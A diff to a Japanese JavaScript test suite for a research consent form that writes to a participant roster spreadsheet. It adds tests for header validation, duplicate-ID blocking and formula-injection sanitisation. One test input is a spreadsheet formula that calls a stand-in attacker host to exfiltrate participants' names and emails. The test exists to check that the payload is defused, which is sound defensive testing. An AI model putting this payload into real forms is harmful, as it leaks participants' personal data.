@@ -125,12 +125,34 @@ function makeForm(id, opts) {
   return form;
 }
 
-/** スプレッドシート（参加者ロスター）のスタブ。★ 2 次元配列を素で持つ。 */
-function makeSheet(rows) {
-  const data = rows.map((r) => [r[0] || "", r[1] || "", r[2] || ""]);
-  return {
-    __rows: data,
+// ⚠️★★★ **スタブを実物の形に合わせる**（2026-08-29・起票 T-23）。
+//   ★ 実物の「参加者ロスター」は **行 1 = 機密バナー / 行 2 = 見出し / 行 3 以降 = データ**
+//     （`Form_Phase1/GSE_Phase1_Form_Builder.gs` の `buildRosterTab_` 逐語:
+//      「行1: 機密バナー…行2: ヘッダ。行3+: データ」）。
+//   ⚠️ 旧スタブは**見出しの無い裸の配列**だったので、「見出しを見る検査」を
+//     **書いても空回りしていた**（★ 検査が見ている側と実物がずれる典型）。
+const ROSTER_BANNER = ["⚠ 実名・メール↔P-ID 対応表（研究者のみ）。共有・コミット禁止。", "", "", ""];
+/** ★ 実物の先頭 4 列（`ROSTER_HEADER` の前半）。⚠️ §11 が実ファイルと照合する。 */
+const ROSTER_HEAD_4 = ["P-ID", "氏名/ニックネーム", "メール", "OS"];
+const ROSTER_LEAD_ROWS = 2;
+
+/**
+ * スプレッドシート（参加者ロスター）のスタブ。★ 2 次元配列を素で持つ。
+ *
+ * - 既定では **バナー行 + 見出し行**を先頭に付ける（★ 実物と同じ形）。
+ * - `opts.raw` … 見出しを付けない（★ `o1NextParticipantId_` の単体テスト用）。
+ * - `opts.header` … 見出し行を差し替える（★ 壊れた見出しを撃つ用）。
+ * - `__rows` は **データ行だけ**を返す（★ 既存の assertion をそのまま活かす）。
+ */
+function makeSheet(rows, opts) {
+  const o = opts || {};
+  const norm = (r) => [r[0] || "", r[1] || "", r[2] || "", r[3] || ""];
+  const lead = o.raw ? [] : [ROSTER_BANNER.slice(), (o.header || ROSTER_HEAD_4).slice()];
+  const data = lead.concat(rows.map(norm));
+  const sheet = {
+    __grid: data,
     getLastRow: () => data.length,
+    getMaxColumns: () => (o.maxColumns === undefined ? 14 : o.maxColumns),
     getRange: (row, col, numRows, numCols) => {
       if (numRows === undefined) {
         // 単一セル
@@ -145,7 +167,7 @@ function makeSheet(rows) {
         getValues: () => {
           const out = [];
           for (let r = row - 1; r < row - 1 + numRows; r++) {
-            const src = data[r] || ["", "", ""];
+            const src = data[r] || ["", "", "", ""];
             out.push(src.slice(col - 1, col - 1 + (numCols || 1)));
           }
           return out;
@@ -153,9 +175,11 @@ function makeSheet(rows) {
       };
     },
     appendRow: (r) => {
-      data.push([r[0] || "", r[1] || "", r[2] || ""]);
+      data.push(norm(r));
     },
   };
+  Object.defineProperty(sheet, "__rows", { get: () => data.slice(lead.length) });
+  return sheet;
 }
 
 /**
@@ -315,7 +339,12 @@ function makeReadyCtx(extra) {
     [O1_S]: makeForm(O1_S, { responses: o.surveyResponses || 0 }),
   };
   const sheets = {
-    [ROSTER_ID]: { 参加者ロスター: makeSheet(o.roster || [["P006", "既存", "old@example.com"]]) },
+    [ROSTER_ID]: {
+      参加者ロスター: makeSheet(o.roster || [["P006", "既存", "old@example.com"]], {
+        header: o.rosterHeader,
+        maxColumns: o.rosterMaxColumns,
+      }),
+    },
   };
   const ctx = makeCtx({ forms, sheets, lockFails: o.lockFails });
   // ⚠️★★ 設定は **スクリプト プロパティ**から読む (2026-08-29 に移した)。
@@ -636,7 +665,11 @@ const push = (name, ok, got) => cases.push({ name, ok, got });
     ["★ 文字列比較ではなく数値比較（P9 < P10）", [["P9"], ["P10"]], "P011"],
   ];
   t.forEach(([label, rows, want]) => {
-    const got = ctx.o1NextParticipantId_(makeSheet(rows));
+    // ⚠️★★ **見出しを付けない裸のシート**で撃つ（`raw: true`）。
+    //   ★ 2026-08-29 にスタブへ見出し 2 行を足したところ、⚠️ どのケースも `last >= 3` になり、
+    //     **「1 行だけのロスター」を撃つケースが消えた**（★ 変異テストが検出した:
+    //     `last >= 1` を `last > 1` に壊しても緑のままだった）。
+    const got = ctx.o1NextParticipantId_(makeSheet(rows, { raw: true }));
     push("§4 " + label, got === want, { want, got });
   });
 }
@@ -762,7 +795,14 @@ const push = (name, ok, got) => cases.push({ name, ok, got });
   // ⚠️★★★ **P-ID 列が空でメールだけ一致する行**（code-reviewer が 2026-08-28 に実測）。
   //   ★ 旧実装は `found.pid` が空なので else に落ち、**同じメールに 2 行目**を作っていた
   //     （＝ 1 人に 2 つの識別子。★ 本ファイルが冒頭で禁じている状態）。
-  const ctx = makeReadyCtx({ roster: [["", "既存", "dup@example.com"]] });
+  // ⚠️ ロスターには**他の参加者の行も要る**（★ T-23 の「P-ID の行が 1 つも無いシートは
+  //   ロスターではない」検査に引っかからない、実物どおりの形にする）。
+  const ctx = makeReadyCtx({
+    roster: [
+      ["P006", "他", "other@example.com"],
+      ["", "既存", "dup@example.com"],
+    ],
+  });
   const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
   ctx.onO1ConsentSubmit(
     makeResponse({
@@ -773,8 +813,8 @@ const push = (name, ok, got) => cases.push({ name, ok, got });
   );
   push(
     "§5 ★★★ P-ID が空の行に当たっても行を増やさない（★ その行に採番して埋める）",
-    roster.__rows.length === 1 && /^P\d{3}$/.test(roster.__rows[0][0]),
-    { rows: roster.__rows.length, pid: roster.__rows[0][0] }
+    roster.__rows.length === 2 && /^P\d{3}$/.test(roster.__rows[1][0]),
+    { rows: roster.__rows.length, pid: roster.__rows[1][0] }
   );
 }
 
@@ -874,7 +914,12 @@ const push = (name, ok, got) => cases.push({ name, ok, got });
 {
   // ⚠️★★ **ロスターの A 列が壊れている行**にメールが一致した場合（Codex 指摘）。
   //   ★ その値をそのまま受付メールに書くと、被験者は**存在しない ID**を信じて入力する。
-  const ctx = makeReadyCtx({ roster: [["見出し", "既存", "broken@example.com"]] });
+  const ctx = makeReadyCtx({
+    roster: [
+      ["P006", "他", "other@example.com"],
+      ["見出し", "既存", "broken@example.com"],
+    ],
+  });
   ctx.onO1ConsentSubmit(
     makeResponse({
       [ctx.Q_O1_NAME]: "既存",
@@ -1228,6 +1273,338 @@ const push = (name, ok, got) => cases.push({ name, ok, got });
   );
 }
 
+// ============================================================
+// §11 ⚠️★★★ ロスターへの書き込みの防波堤（起票 T-22 / T-23 / T-24）
+// ============================================================
+
+{
+  // --- T-22: OS を D 列に書く ---
+  const ctx = makeReadyCtx();
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  ctx.onO1ConsentSubmit(
+    makeResponse({
+      [ctx.Q_O1_NAME]: "新規",
+      [ctx.Q_O1_EMAIL]: "new@example.com",
+      [ctx.Q_O1_OS]: "Windows",
+    })
+  );
+  push(
+    "§11 T-22 ★ 新規行の D 列に OS が入る",
+    roster.__rows.length === 2 && roster.__rows[1][3] === "Windows",
+    { row: roster.__rows[1] }
+  );
+}
+
+{
+  // --- T-22: 既存行は「空のときだけ」補う（★ メール補充と同型） ---
+  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com", ""]] });
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  ctx.onO1ConsentSubmit(
+    makeResponse({
+      [ctx.Q_O1_NAME]: "既存",
+      [ctx.Q_O1_EMAIL]: "old@example.com",
+      [ctx.Q_O1_OS]: "Mac",
+    })
+  );
+  push("§11 T-22 ★ 既存行の空の D 列は補われる", roster.__rows[0][3] === "Mac", {
+    row: roster.__rows[0],
+  });
+}
+
+{
+  // ⚠️★★ **陰性対照**: 既に入っている OS を上書きしない（★ 研究者が手で直した値を守る）。
+  const ctx = makeReadyCtx({ roster: [["P006", "既存", "old@example.com", "Windows(手入力)"]] });
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  ctx.onO1ConsentSubmit(
+    makeResponse({
+      [ctx.Q_O1_NAME]: "既存",
+      [ctx.Q_O1_EMAIL]: "old@example.com",
+      [ctx.Q_O1_OS]: "Mac",
+    })
+  );
+  push(
+    "§11 T-22 ⚠️ 既に入っている OS は上書きしない",
+    roster.__rows[0][3] === "Windows(手入力)",
+    { row: roster.__rows[0] }
+  );
+}
+
+{
+  // --- T-23: 見出しが違うシートは拒否する ---
+  const ctx = makeReadyCtx({ rosterHeader: ["ID", "なまえ", "アドレス", "OS"] });
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  ctx.onO1ConsentSubmit(
+    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
+  );
+  push(
+    "§11 T-23 ⚠️★★★ 見出しが違うシートには書き込まない（fail-closed）",
+    roster.__rows.length === 1 && ctx.__mails.length === 0,
+    { rows: roster.__rows.length, mails: ctx.__mails.length }
+  );
+  push(
+    "§11 T-23 ★ 理由をログに出す（★ 研究者が直せる形で）",
+    ctx.__logs.some((l) => l.indexOf("参加者ロスターの形をしていません") >= 0),
+    {}
+  );
+}
+
+{
+  // ⚠️★ **A 列だけ合っていて 2 列目以降が違う**シート（★ 列の照合そのものを撃つ）。
+  //   ⚠️ これが無いと「見出し行を探す」検査だけで赤になり、**列の一致検査が空回り**していても気づけない。
+  const ctx = makeReadyCtx({ rosterHeader: ["P-ID", "なまえ", "メール", "OS"] });
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  ctx.onO1ConsentSubmit(
+    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
+  );
+  push(
+    "§11 T-23 ⚠️ 2 列目以降が違う見出しも拒否する（★ 列の照合を撃つ）",
+    roster.__rows.length === 1 && ctx.__mails.length === 0,
+    { rows: roster.__rows.length, mails: ctx.__mails.length }
+  );
+}
+
+{
+  // ⚠️★★★ **新規に作った空のロスター**（見出しはあるが P-ID の行が無い）を弾く。
+  //   ★ これが「O1 用のロスターを作ってしまった」ときの実際の形である。
+  const ctx = makeReadyCtx({ roster: [] });
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  ctx.onO1ConsentSubmit(
+    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
+  );
+  push(
+    "§11 T-23 ⚠️★★★ 新規に作った空のロスターには採番しない（★ P001 衝突を防ぐ）",
+    roster.__rows.length === 0 && ctx.__mails.length === 0,
+    { rows: roster.__rows.length, mails: ctx.__mails.length }
+  );
+}
+
+{
+  // ★ **陽性対照**: 正しい形のロスターは通る（⚠️ 検査が全部止めているだけではない）。
+  const ctx = makeReadyCtx();
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  ctx.onO1ConsentSubmit(
+    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "ok@example.com" })
+  );
+  push(
+    "§11 T-23 ★ 陽性対照: 正しいロスターなら通る",
+    roster.__rows.length === 2 && ctx.__mails.length === 1,
+    { rows: roster.__rows.length, mails: ctx.__mails.length }
+  );
+}
+
+{
+  // --- T-24: 同じ P-ID が 2 行あったら受付メールを送らない ---
+  //   ⚠️ 別プロジェクト（G1 / Phase1）が**同時に採番した**状況を、
+  //     ★ ロスターに同じ P-ID を 2 行置くことで再現する。
+  const ctx = makeReadyCtx({
+    roster: [
+      ["P006", "既存", "old@example.com"],
+      ["P007", "先客", "first@example.com"],
+    ],
+  });
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  // ★ 新規が来ると P008 が振られる。⚠️ そのあとで「P008 が既に居た」状態を作る。
+  const sheet = roster;
+  const origAppend = sheet.appendRow;
+  sheet.appendRow = (r) => {
+    origAppend(r);
+    origAppend([r[0], "衝突した別人", "clash@example.com", ""]); // ⚠️ 同じ P-ID の 2 行目
+  };
+  ctx.onO1ConsentSubmit(
+    makeResponse({
+      [ctx.Q_O1_NAME]: "新規",
+      [ctx.Q_O1_EMAIL]: "new@example.com",
+      [ctx.Q_O1_OS]: "Mac",
+    })
+  );
+  push(
+    "§11 T-24 ⚠️★★★ 同じ P-ID が 2 行あるとき受付メールを送らない（fail-closed）",
+    ctx.__mails.length === 0,
+    { mails: ctx.__mails.length }
+  );
+  push(
+    "§11 T-24 ★ 重複した行番号と「研究者が決める」ことをログに出す",
+    ctx.__logs.some((l) => l.indexOf("同じ P-ID が") >= 0) &&
+      ctx.__logs.some((l) => l.indexOf("研究者が決めてください") >= 0),
+    {}
+  );
+}
+
+{
+  // ⚠️★★ **検査そのものが失敗したとき（`null`）は送る**（★ decisions.md G-3 の分岐）。
+  //   ⚠️ cross-review が「この分岐にケースが無い」と指摘したので足した（2026-08-29）。
+  //   ★ 発番のあとにロスターが読めなくなった状況を、シートを差し替えて作る。
+  const ctx = makeReadyCtx();
+  const sheets = ctx.__sheets[ROSTER_ID];
+  const orig = sheets["参加者ロスター"];
+  let appended = false;
+  const guard = Object.create(orig);
+  guard.appendRow = (r) => {
+    orig.appendRow(r);
+    appended = true;
+    delete sheets["参加者ロスター"]; // ⚠️ 以後 o1OpenRoster_ は null を返す
+  };
+  sheets["参加者ロスター"] = guard;
+  ctx.onO1ConsentSubmit(
+    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "unreadable@example.com" })
+  );
+  push(
+    "§11 T-24 ★ 重複検査ができなかったときは**送る**（⚠️ 検査の失敗で被験者を止めない）",
+    appended && ctx.__mails.length === 1,
+    { appended, mails: ctx.__mails.length }
+  );
+  push(
+    "§11 T-24 ★ そのとき「検査ができませんでした」をログに残す",
+    ctx.__logs.some((l) => l.indexOf("重複検査ができませんでした") >= 0),
+    {}
+  );
+}
+
+{
+  // ★ **陽性対照**: 重複が無ければ送る（⚠️ T-24 が常に止めているのではない）。
+  const ctx = makeReadyCtx();
+  ctx.onO1ConsentSubmit(
+    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "solo@example.com" })
+  );
+  push("§11 T-24 ★ 陽性対照: 重複が無ければ送る", ctx.__mails.length === 1, {
+    mails: ctx.__mails.length,
+  });
+}
+
+{
+  // ★ 読み取り専用の点検関数（⚠️ 配備直後に実物へ撃つためのもの）。
+  const ok = makeReadyCtx();
+  ok.checkO1RosterShape();
+  const bad = makeReadyCtx({ rosterHeader: ["ID", "なまえ", "アドレス", "OS"] });
+  bad.checkO1RosterShape();
+  push(
+    "§11 T-23 ★ checkO1RosterShape は正しいロスターを ✅ と言う",
+    ok.__logs.some((l) => l.indexOf("ロスターの形は正しい") >= 0),
+    {}
+  );
+  push(
+    "§11 T-23 ★ checkO1RosterShape は形が違えば ⛔ と理由を言う",
+    bad.__logs.some((l) => l.indexOf("ロスターの形が違います") >= 0),
+    {}
+  );
+  push(
+    "§11 T-23 ⚠️ 点検関数は**書き込まない**（★ 行が増えない）",
+    ok.__sheets[ROSTER_ID]["参加者ロスター"].__rows.length === 1,
+    { rows: ok.__sheets[ROSTER_ID]["参加者ロスター"].__rows.length }
+  );
+  push(
+    "§11 T-23 ⚠️ 点検関数は PII（メール）をログに出さない",
+    !ok.__logs.some((l) => l.indexOf("@") >= 0),
+    {}
+  );
+}
+
+{
+  // ⚠️★★★ **数式インジェクション**（security-checker HIGH・2026-08-29）。
+  //   ★ 氏名欄は被験者の自由記入で、フォーム URL は配られる。⚠️ `=IMPORTDATA(...)` を
+  //     ロスターへ素で書くと、**研究者が開いた瞬間に全参加者の氏名とメールが外部へ出る**。
+  const attack = '=IMPORTDATA("https://attacker.example/x?d="&TEXTJOIN(",",1,B2:C200))';
+  const ctx = makeReadyCtx();
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  ctx.onO1ConsentSubmit(
+    makeResponse({
+      [ctx.Q_O1_NAME]: attack,
+      [ctx.Q_O1_EMAIL]: "attacker@example.com",
+      [ctx.Q_O1_OS]: "Windows",
+    })
+  );
+  const written = roster.__rows[1] && String(roster.__rows[1][1]);
+  push(
+    "§11 ⚠️★★★ 氏名の数式インジェクションを無害化してから書く",
+    !!written && written.charAt(0) === "'" && written.indexOf("IMPORTDATA") > 0,
+    { head: written && written.slice(0, 12) }
+  );
+  push(
+    "§11 ★ 陰性対照: ふつうの氏名には印を付けない",
+    ctx.o1PlainText_("三浦 太郎") === "三浦 太郎",
+    { got: ctx.o1PlainText_("三浦 太郎") }
+  );
+  ["=x", "+x", "-x", "@x"].forEach((bad) => {
+    push(`§11 ★ 先頭 "${bad.charAt(0)}" も無害化する`, ctx.o1PlainText_(bad).charAt(0) === "'", {
+      got: ctx.o1PlainText_(bad),
+    });
+  });
+}
+
+{
+  // ⚠️★★★ **古いほうの管理シートは「形が合っていても」拒否する**
+  //   （security-checker MEDIUM・2026-08-29）。★ 旧シートは同じ見出しと P-ID の行を持つ。
+  const ctx = makeReadyCtx();
+  ctx.__props.PHASE1_MGMT_SHEET_ID = "12T8WU4D-OLD-SHEET-STUB";
+  ctx.__sheets["12T8WU4D-OLD-SHEET-STUB"] = ctx.__sheets[ROSTER_ID]; // ★ 形は正しい
+  const roster = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  ctx.onO1ConsentSubmit(
+    makeResponse({ [ctx.Q_O1_NAME]: "新規", [ctx.Q_O1_EMAIL]: "x@example.com" })
+  );
+  push(
+    "§11 ⚠️★★★ 古い管理シートには書き込まない（★ 形の検査では止まらない）",
+    roster.__rows.length === 1 && ctx.__mails.length === 0,
+    { rows: roster.__rows.length, mails: ctx.__mails.length }
+  );
+  const insp = makeReadyCtx();
+  insp.__props.PHASE1_MGMT_SHEET_ID = "12T8WU4D-OLD-SHEET-STUB";
+  insp.__sheets["12T8WU4D-OLD-SHEET-STUB"] = insp.__sheets[ROSTER_ID];
+  insp.checkO1RosterShape();
+  push(
+    "§11 ⚠️ 点検関数も古い管理シートを ✅ と言わない",
+    insp.__logs.some((l) => l.indexOf("古いほうの管理シート") >= 0) &&
+      !insp.__logs.some((l) => l.indexOf("ロスターの形は正しい") >= 0),
+    {}
+  );
+}
+
+{
+  // ⚠️★ 「書き込まない」を**行数だけ**で測っていた（security-checker LOW）。
+  //   ★ 既存セルへの `setValue` が足されても緑のままだった。→ **呼ばれたら throw** で撃つ。
+  const ctx = makeReadyCtx();
+  const sheet = ctx.__sheets[ROSTER_ID]["参加者ロスター"];
+  const origRange = sheet.getRange;
+  sheet.appendRow = () => {
+    throw new Error("点検関数が appendRow を呼んだ");
+  };
+  sheet.getRange = (...args) => {
+    const r = origRange(...args);
+    if (r.setValue) r.setValue = () => {
+      throw new Error("点検関数が setValue を呼んだ");
+    };
+    return r;
+  };
+  let threw = null;
+  try {
+    ctx.checkO1RosterShape();
+  } catch (e) {
+    threw = String(e.message);
+  }
+  push("§11 T-23 ⚠️ 点検関数は書き込み系メソッドを 1 度も呼ばない", threw === null, { threw });
+}
+
+{
+  // ⚠️★★ **2 か所に同じ定数を持っている**ので、ずれたら赤にする。
+  //   ★ `O1_ROSTER_HEAD` は Phase1 の `ROSTER_HEADER` の**先頭 4 列**でなければならない。
+  const phase1 = fs.readFileSync(
+    path.join(__dirname, "..", "Form_Phase1", "GSE_Phase1_Form_Builder.gs"),
+    "utf8"
+  );
+  const m = phase1.match(/var\s+ROSTER_HEADER\s*=\s*\[([\s\S]{0,600}?)\]/);
+  const items = m ? [...m[1].matchAll(/"([^"]{1,30})"/g)].map((x) => x[1]) : [];
+  const head4 = items.slice(0, 4);
+  push(
+    "§11 ★ O1_ROSTER_HEAD が Phase1 の ROSTER_HEADER 先頭 4 列と一致する",
+    items.length === 14 && JSON.stringify(head4) === JSON.stringify(ROSTER_HEAD_4),
+    { phase1Head4: head4, o1: ROSTER_HEAD_4, total: items.length }
+  );
+  push(
+    "§11 ★ .gs 側の O1_ROSTER_HEAD も同じ 4 列である",
+    JSON.stringify(makeReadyCtx().O1_ROSTER_HEAD) === JSON.stringify(ROSTER_HEAD_4),
+    { gs: makeReadyCtx().O1_ROSTER_HEAD }
+  );
+}
+
 // --- 出力 ---------------------------------------------------------------------
 // ⚠️★ 末尾 1 行の書式は `o1_submit_guard_test.cjs` と**同一にする**
 //   （`run.sh` / `check-o1-release-readiness.sh` が `^全 <N> ケース期待どおり$` を読む）。
@@ -1240,11 +1617,11 @@ cases.forEach((c) => {
 // ⚠️ ★ 「NG が 0 件なら緑」だけだと、**ケースを 0 件にしても緑になる**。★ 下限を置く。
 // ⚠️★ 下限は**実数に近づける**（code-reviewer 指摘・2026-08-28）。
 //   ★ 45 のままだと実数 89 に対して**半分近く削っても緑**で、「削られていないか」を測れていない。
-// ⚠️★ 実数に近づけて保つ（★ 2026-08-29: 98 件なので下限 95）。
+// ⚠️★ 実数に近づけて保つ（★ 2026-08-29: security-checker 対応で 129 件なので下限 124）。
 //   ⚠️ 離れたままだと「テストが 13 件消えても気づかない」状態になる。
-if (cases.length < 95) {
+if (cases.length < 124) {
   console.log(
-    `\n${cases.length} 件しかケースが無い（95 未満）。テストが削られていないか確認すること。`
+    `\n${cases.length} 件しかケースが無い（124 未満）。テストが削られていないか確認すること。`
   );
   process.exit(1);
 }
